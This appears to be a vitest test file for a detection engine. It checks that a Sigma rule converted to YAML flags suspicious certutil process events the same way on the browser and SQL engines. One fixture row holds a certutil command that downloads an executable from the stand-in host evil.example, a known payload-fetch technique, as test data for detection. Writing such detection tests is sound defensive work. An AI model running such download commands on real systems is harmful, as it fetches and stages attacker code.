import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import yaml from 'js-yaml'
import { describe, expect, it } from 'vitest'
import { runRule, validateRule } from './engine'

// Golden fixture written by the Python converter (tests/backend/test_sigma.py). Both engines must
// accept the same YAML and match the same events.
const TEXT = readFileSync(join(__dirname, '../../../tests/fixtures/sigma_converted.yaml'), 'utf-8')

describe('Sigma-converted rules on the browser engine', () => {
  it('validates the converted rule and matches the same events as the SQL engine', () => {
    const v = validateRule(yaml.load(TEXT))
    expect(v.ok).toBe(true)
    if (!v.ok) return
    const sysmon = 'Microsoft-Windows-Sysmon/Operational'
    const rows = [
      {
        id: 1,
        ts: 1,
        eventId: 1,
        channel: sysmon,
        image: 'C:\\Windows\\System32\\certutil.exe',
        commandLine: 'certutil -urlcache -split -f http://evil.example/a.exe a.exe',
        parentImage: 'C:\\Windows\\System32\\cmd.exe',
        data: {},
      },
      { id: 2, ts: 2, eventId: 1, channel: sysmon, image: 'C:\\Windows\\System32\\certutil.exe', commandLine: 'certutil -urlcache -f http://x/y', parentImage: 'C:\\Windows\\explorer.exe', data: {} },
      {
        id: 3,
        ts: 3,
        eventId: 4688,
        channel: 'Security',
        processName: 'C:\\Windows\\System32\\certutil.exe',
        commandLine: 'CERTUTIL -URLCACHE http://x',
        parentProcessName: 'C:\\Windows\\System32\\cmd.exe',
        data: {},
      },
      { id: 4, ts: 4, eventId: 1, channel: sysmon, image: 'C:\\Windows\\notepad.exe', commandLine: 'notepad -urlcache http', parentImage: 'C:\\a.exe', data: {} },
      { id: 5, ts: 5, eventId: 7, channel: sysmon, image: 'C:\\Windows\\System32\\certutil.exe', commandLine: 'certutil -urlcache http', data: {} },
    ]
    const findings = runRule(v.rule, { rows })
    const refs = findings.flatMap((f) => (f.refs ?? []) as number[]).sort((a, b) => a - b)
    expect(refs).toEqual([1, 3])
  })
})
